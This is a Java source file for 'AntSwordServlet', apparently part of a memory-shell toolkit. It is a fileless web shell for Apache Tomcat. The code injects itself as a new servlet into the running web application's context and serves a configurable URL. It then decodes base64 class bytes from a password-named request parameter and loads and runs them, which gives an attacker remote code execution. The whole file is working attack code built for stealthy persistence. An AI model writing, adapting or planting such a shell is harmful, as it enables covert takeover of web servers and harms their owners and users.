package org.erosion2020.memshell;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

public class AntSwordServlet extends ClassLoader implements Servlet {

    public String cs = "UTF-8";
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;

    public AntSwordServlet() {
    }

    public AntSwordServlet(ClassLoader c) {
        super(c);
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
        } catch (Exception e) {
            output.append("ERROR:// " + e.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception ignore) { }

        return true;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])obj;
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception e) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception eChild) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception ignore) { }
                    }
                }
            }
        }
    }

    public static String name;
    public static String pattern;
    public static String password;

    static {
        try{
            WebappClassLoaderBase loader =
                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext context = (StandardContext) loader.getResources().getContext();
            Wrapper wrapper = context.createWrapper();
            wrapper.setName(name);
            wrapper.setLoadOnStartup(1);
            wrapper.setServlet(new AntSwordServlet());
            wrapper.setServletClass(AntSwordServlet.class.getName());

            context.addChild(wrapper);
            context.addServletMappingDecoded(pattern, name);
        }catch (Exception ignored){ }
    }
    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        HttpServletRequest req = (HttpServletRequest)servletRequest;
        HttpServletResponse res = (HttpServletResponse)servletResponse;
        String cls = req.getParameter(password);
        if (cls != null) {
            try {
                (new AntSwordServlet(this.getClass().getClassLoader())).g(this.base64Decode(cls)).newInstance().equals(new Object[]{req, res});
            } catch (Exception ignore) { }
        }

    }

    public byte[] base64Decode(String str) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64=Class.forName("sun.misc.BASE64Decoder");
            Object decoder = base64.newInstance();
            value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
        } catch (Exception e) {
            try {
                base64=Class.forName("java.util.Base64");
                Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
                value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
            } catch (Exception ee) {}
        }
        return value;
    }

    @Override
    public String getServletInfo() {
        return "";
    }

    @Override
    public void destroy() {

    }
}
